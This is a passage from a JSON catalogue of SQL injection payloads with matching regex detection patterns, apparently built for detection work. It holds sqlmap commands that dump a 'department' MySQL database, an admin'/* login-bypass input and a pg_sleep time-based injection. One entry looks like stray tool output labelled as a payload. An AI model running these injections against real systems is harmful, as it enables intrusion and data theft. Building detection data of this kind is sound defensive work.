      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/intern/controller\\.php\"\\ \\-p\\ \"email\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"phone=\\&email=test\\&deptType=3\\&name=\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/intern/\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ department\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/intern/co [ea4ebe70]",
      "payload": "sqlmap.py -u \"http://localhost/intern/controller.php\" -p \"name\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"phone=&email=&deptType=3&name=test\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/intern/\" --dbms=\"MySQL\" --batch --dbs -D department --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/intern/controller\\.php\"\\ \\-p\\ \"name\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"phone=\\&email=\\&deptType=3\\&name=test\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/intern/\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ department\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI sqlmap.py -u \"http://localhost/intern/co [a6a5c563]",
      "payload": "sqlmap.py -u \"http://localhost/intern/controller.php\" -p \"phone\" --risk=\"3\" --level=\"3\" --method=\"POST\" --data=\"phone=test&email=&deptType=3&name=\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\" --headers=\"Host:localhost\\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\nAccept-Encoding:gzip, deflate\\nAccept-Language:en-us,en;q=0.5\\nCache-Control:no-cache\\nContent-Type:application/x-www-form-urlencoded\\nReferer:http://localhost/intern/\" --dbms=\"MySQL\" --batch --dbs -D department --dump",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "sqlmap\\.py\\ \\-u\\ \"http://localhost/intern/controller\\.php\"\\ \\-p\\ \"phone\"\\ \\-\\-risk=\"3\"\\ \\-\\-level=\"3\"\\ \\-\\-method=\"POST\"\\ \\-\\-data=\"phone=test\\&email=\\&deptType=3\\&name=\"\\ \\-\\-user\\-agent=\"Mozilla/5\\.0\\ \\(Windows\\ NT\\ 10\\.0;\\ Win64;\\ x64\\)\\ AppleWebKit/537\\.36\\ \\(KHTML,\\ like\\ Gecko\\)\\ Chrome/100\\.0\\.4896\\.127\\ Safari/537\\.36\"\\ \\-\\-headers=\"Host:localhost\\\\nAccept:text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,image/apng,\\*/\\*;q=0\\.8\\\\nAccept\\-Encoding:gzip,\\ deflate\\\\nAccept\\-Language:en\\-us,en;q=0\\.5\\\\nCache\\-Control:no\\-cache\\\\nContent\\-Type:application/x\\-www\\-form\\-urlencoded\\\\nReferer:http://localhost/intern/\"\\ \\-\\-dbms=\"MySQL\"\\ \\-\\-batch\\ \\-\\-dbs\\ \\-D\\ department\\ \\-\\-dump",
      "tags": [
        "mysql"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI username: admin'/* [4803fca4]",
      "payload": "username: admin'/*",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "username:\\ admin'/\\*",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI | @@version | [2e584911]",
      "payload": "| @@version               |",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\|\\ @@version\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\|",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ||(select 1 from pg_sleep(5)) [b3bf99b0]",
      "payload": "||(select 1 from pg_sleep(5))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\|\\|\\(select\\ 1\\ from\\ pg_sleep\\(5\\)\\)",
      "tags": [
        "postgres",
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    }
  ]
}